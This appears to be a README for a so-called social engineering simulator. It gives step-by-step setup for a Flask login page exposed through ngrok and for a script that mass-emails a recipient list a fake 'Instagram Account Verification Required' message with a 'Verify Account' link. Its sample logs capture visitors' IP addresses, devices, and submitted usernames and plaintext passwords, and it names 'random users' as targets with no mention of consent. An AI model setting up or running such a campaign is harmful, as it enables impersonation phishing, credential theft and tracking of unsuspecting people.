# 📱 Share Application with Random Users

## 🎯 Goal
Allow your friends and random users to access the login page from their devices and automatically log their IP addresses and device info.

---

## ✅ Option 1: Same WiFi Network (Easiest)

### For You (Server):
- Application is running on: `http://192.168.0.103:5000/`
- Keep it running

### For Your Friend (Client):
1. Make sure they're on **the same WiFi network** as you
2. Send them this link: `http://192.168.0.103:5000/`
3. They open it in their browser
4. Their IP (e.g., `192.168.1.50`) gets logged automatically!

**Logged Event (Friend's Device):**
```
====== LOGIN EVENT ======
Time       : 2026-04-30 23:50:15.123456
Action     : Login Button Clicked
IP Address : 192.168.1.50          ← Friend's WiFi IP
Device     : Chrome / Windows
Username   : 
Password   : 
Status     : 
=========================
```

---

## 🌐 Option 2: Email Link (NEW! - Multi-Device Access)

### ⚙️ How It Works:
1. Start Flask app + ngrok tunnel
2. Run email sender script
3. Emails automatically include the **public ngrok URL**
4. Recipients click the email link from **any device, anywhere**
5. All access logs are captured with IP & device info

### 🚀 Quick Setup:

**Step 1: Have recipients list ready**
- Create/edit `receivers.txt`
- One email address per line:
```
friend@gmail.com
random.user@yahoo.com
test@hotmail.com
```

**Step 2: Start Flask + ngrok**
```bash
# Run the start script (automatically starts both):
share_with_ngrok.bat

OR manually run both:
- Terminal 1: python app.py
- Terminal 2: ngrok http 5000
```

**Step 3: Install dependencies (one-time)**
```bash
pip install -r requirements.txt
```

**Step 4: Send emails with live links**
```bash
python mail_sender.py
```

### What Recipients See:
- Email with subject: "Instagram Account Verification Required"
- Button: "Verify Account" 
- Link automatically includes **current ngrok public URL**
- Works from any device, any location worldwide

### What Gets Logged:
```
====== LOGIN EVENT ======
Time       : 2026-04-30 23:50:15.123456
Action     : Email Link Clicked
IP Address : 203.120.45.67          ← Recipient's real IP
Device     : Safari / iPhone
Status     : 
=========================
```

---

### Why ngrok?
- Creates a **public URL** anyone can access
- Friend doesn't need to be on your WiFi
- Random users from anywhere can access
- Each access logs their real IP address

### ⚙️ Setup Steps:

**Step 1: Download ngrok**
1. Go to: https://ngrok.com/download
2. Download Windows version
3. Extract `ngrok.exe`
4. Place it in `d:\socialeng_simulator\socialeng_simulator\` folder

**Step 2: Run the sharing script**
1. Double-click: `share_with_ngrok.bat`
2. Two windows open:
   - Flask App (backend)
   - ngrok tunnel (creates public URL)

**Step 3: Copy & Share the Public URL**
- ngrok shows: `https://abc123def456.ngrok.io`
- Send this to your friend!

**Example:**
```
Friend, open this link:
https://abc123def456.ngrok.io/
```

**Step 4: Friend Opens Link**
- They click "Go to Login"
- Their **real IP address** gets logged
- Example: `Friend's IP: 203.120.45.67`

---

## 📊 What Gets Logged

### Same WiFi Network
```
IP Address : 192.168.1.50          ← Local WiFi IP
Device     : Chrome / Windows
```

### Different Network (ngrok)
```
IP Address : 203.120.45.67          ← Internet IP (India/US/etc)
Device     : Safari / iOS
```

---

## 🔄 Complete Example Flow

**Your Setup:**
```
You run:  python app.py
OR
You run:  share_with_ngrok.bat (for public access)
```

**Your Friend:**
```
Friend opens:  http://192.168.0.103:5000/
OR
Friend opens:  https://abc123def456.ngrok.io/
```

**Result in login_events.txt:**
```
====== LOGIN EVENT ======
Time       : 2026-04-30 23:50:30.654321
Action     : Login Button Clicked
IP Address : 192.168.1.50
Device     : Chrome / Windows
Username   : 
Password   : 
Status     : 
=========================

====== LOGIN EVENT ======
Time       : 2026-04-30 23:50:45.987654
Action     : Login Form Submitted
IP Address : 192.168.1.50
Device     : Chrome / Windows
Username   : john_doe
Password   : test123
Status     : Login Successfully
=========================
```

---

## 🛠️ Troubleshooting

### "Friend can't access localhost"
**Solution:** They can't! Localhost is only your machine.
- Use network IP `192.168.0.103:5000` OR
- Use ngrok public URL

### "Network IP doesn't work"
**Check:**
1. Same WiFi network?
2. Windows Firewall: Allow port 5000
3. Try sharing ngrok URL instead

### "ngrok URL shows 'Page Not Responding'"
1. Make sure Flask app is running
2. ngrok window should show connection logs
3. Restart both

### "IP not being logged"
1. Check `login_events.txt` file exists
2. Make sure they clicked "Go to Login"
3. Reload page in browser

---

## 📝 Quick Commands

**Local Network (Same WiFi):**
```
cd d:\socialeng_simulator\socialeng_simulator
python app.py
Share: http://192.168.0.103:5000/
```

**Public Network (ngrok):**
```
1. Download ngrok from https://ngrok.com/download
2. Extract ngrok.exe to app folder
3. Double-click share_with_ngrok.bat
4. Copy the https URL and share
```

---

## ✅ What You'll See

**In Terminal (When Friend Logs In):**
```
====== LOGIN EVENT ======
Time       : 2026-04-30 23:50:45.987654
Action     : Login Form Submitted
IP Address : 192.168.1.50
Device     : Chrome / Windows
Username   : testuser
Password   : test123
Status     : Login Successfully
=========================
```

**In login_events.txt File:**
- All events permanently saved
- Friend's IP logged
- Friend's device logged
- All timestamps recorded

---

**Choose the option that fits your needs:**
- 🏠 **Same WiFi?** → Use network IP
- 🌍 **Different locations?** → Use ngrok

Both automatically log the visitor's IP and device info! ✅
